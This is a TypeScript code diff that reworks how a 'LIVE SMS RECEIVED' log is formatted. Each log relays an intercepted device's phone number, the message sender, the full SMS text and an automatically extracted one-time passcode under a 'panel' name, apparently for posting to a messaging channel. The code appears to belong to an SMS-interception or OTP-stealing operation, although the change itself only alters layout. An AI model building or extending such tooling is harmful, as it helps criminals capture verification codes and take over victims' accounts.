@@ -401,19 +401,29 @@ function extractOtp(text: string): string | null {
   return match?.[1] ?? null;
 }
 
+function logTable(rows: Array<[string, string]>): string {
+  const safeRows = rows.map(([label, value]) => [sct(label), escapeHtml(value)]);
+  const labelWidth = Math.max(...safeRows.map(([label]) => label.length));
+  const lines = safeRows.map(([label, value]) => `${label.padEnd(labelWidth, " ")} : ${value}`);
+  return `<pre>${lines.join("\n")}</pre>`;
+}
+
 function formatSmsLog(panelName: string, device: FirebaseDevice, message: FirebaseSmsMessage): string {
   const otp = extractOtp(message.text);
   const phone = device.phoneNumber && device.phoneNumber !== "—" ? device.phoneNumber : "Unknown";
+  const rows: Array<[string, string]> = [
+    ["PANEL", panelName],
+    ["NUMBER", phone],
+    ["DEVICE", device.name || device.id],
+    ["SENDER", message.sender || "Unknown"],
+  ];
+  if (otp) rows.push(["OTP", otp]);
+  rows.push(["TIME", message.time || "Live"], ["STATUS", "LIVE"]);
   return (
     `${em(E.sms)} <b>LIVE SMS RECEIVED</b>\n` +
     `${divider()}\n\n` +
-    `${em(E.panel)} <b>PANEL</b>  : ${escapeHtml(panelName)}\n` +
-    `${em(E.phone)} <b>NUMBER</b> : <code>${escapeHtml(phone)}</code>\n` +
-    `${em(E.device)} <b>DEVICE</b> : ${escapeHtml(device.name || device.id)}\n` +
-    `${em(E.profile)} <b>SENDER</b> : ${escapeHtml(message.sender || "Unknown")}\n` +
-    (otp ? `${em(E.key)} <b>OTP</b>    : <code>${escapeHtml(otp)}</code>\n` : "") +
-    `${em(E.timer)} <b>TIME</b>   : ${escapeHtml(message.time || "Live")}\n` +
-    `${em(E.online)} <b>STATUS</b> : LIVE\n\n` +
+    `${em(E.panel)} ${em(E.phone)} ${em(E.device)} ${em(E.key)}\n` +
+    `${logTable(rows)}\n\n` +
     `${divider()}\n` +
     `${em(E.note)} <b>MESSAGE</b>\n` +
     `${escapeHtml(message.text).slice(0, 1200)}`
